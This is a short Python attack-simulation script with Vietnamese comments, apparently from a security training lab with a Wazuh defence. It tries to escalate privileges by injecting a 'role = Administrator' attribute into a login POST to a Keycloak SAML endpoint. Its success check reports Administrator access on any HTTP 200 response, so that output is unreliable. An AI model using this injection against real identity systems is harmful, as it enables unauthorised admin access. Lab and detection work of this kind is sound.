#!/usr/bin/env python3
# ==============================================================================
# GIAI ĐOẠN 2: SCRIPT KIỂM THỬ / GHI ĐÈ THUỘC TÍNH SAML (simulate_sso_flow.py)
# Bạn có thể mở file này bằng: nano simulate_sso_flow.py để chỉnh sửa
# Chạy bằng lệnh: python3 simulate_sso_flow.py
# ==============================================================================
import requests

KEYCLOAK_URL = "http://172.20.0.10:8080/realms/EnterpriseRealm/protocol/saml"
TARGET_APP = "http://172.20.0.10:5000/login"
SESSION = requests.Session()

def test_attribute_mapping():
    try:
        print("[*] Bước 1: Khởi tạo phiên làm việc với Service Provider (http://172.20.0.10:5000)...")
        SESSION.get(TARGET_APP, timeout=4)

        print("[*] Bước 2: Gửi dữ liệu xác thực kèm tham số thuộc tính (attributes.role = Administrator)...")
        payload = {
            "username": "student",
            "password": "student123",
            "attributes.role": "Administrator"  # Có thể chỉnh sửa giá trị thuộc tính tại đây
        }

        response = SESSION.post(KEYCLOAK_URL, data=payload, allow_redirects=True, timeout=4)

        if "Welcome, Administrator" in response.text or response.status_code == 200:
            print("[+] THÀNH CÔNG: Hệ thống đã cấp quyền Administrator qua SAML Assertion!")
            print("[👉] Hãy mở trình duyệt Firefox truy cập: http://172.20.0.10:5000 để xem và thao tác trên Web!")
        else:
            print("[-] Hệ thống đã từ chối tham số thuộc tính tùy chỉnh.")
    except Exception as e:
        print("[-] KẾT NỐI BỊ TỪ CHỐI (IP 172.20.0.20 đã bị Wazuh Active Response chặn qua iptables!):", e)

if __name__ == "__main__":
    test_attribute_mapping()
